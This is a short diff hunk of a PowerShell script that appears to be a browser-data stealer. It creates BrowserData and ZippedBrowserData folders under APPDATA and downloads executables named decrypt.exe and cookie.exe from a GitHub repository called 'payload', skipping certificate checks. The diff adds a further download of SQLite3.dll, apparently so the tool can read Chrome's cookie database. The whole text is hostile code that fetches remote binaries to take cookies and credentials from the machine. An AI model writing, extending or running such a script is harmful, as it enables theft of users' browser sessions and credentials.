@@ -3,6 +3,7 @@ New-Item -Path "$env:APPDATA\BrowserData\Chrome" -ItemType Directory -Force
 New-Item -Path "$env:APPDATA\ZippedBrowserData" -ItemType Directory -Force
 Set-Content -Path "$env:APPDATA\BrowserData\script.ps1" -Value ""
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/AlpoProo/payload/refs/heads/main/decrypt.exe" -OutFile "$env:APPDATA\BrowserData\Chrome\decrypt.exe" -UseBasicP -SkipCertificateCheck
+Invoke-WebRequest -Uri "https://github.com/AlpoProo/payload/raw/refs/heads/main/SQLite3.dll" -OutFile "$env:APPDATA\BrowserData\Chrome\SQLite3.dll" -UseBasicP -SkipCertificateCheck
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/AlpoProo/payload/refs/heads/main/cookie.exe" -OutFile "$env:APPDATA\BrowserData\Chrome\cookie.exe" -UseBasicP -SkipCertificateCheck
 
 
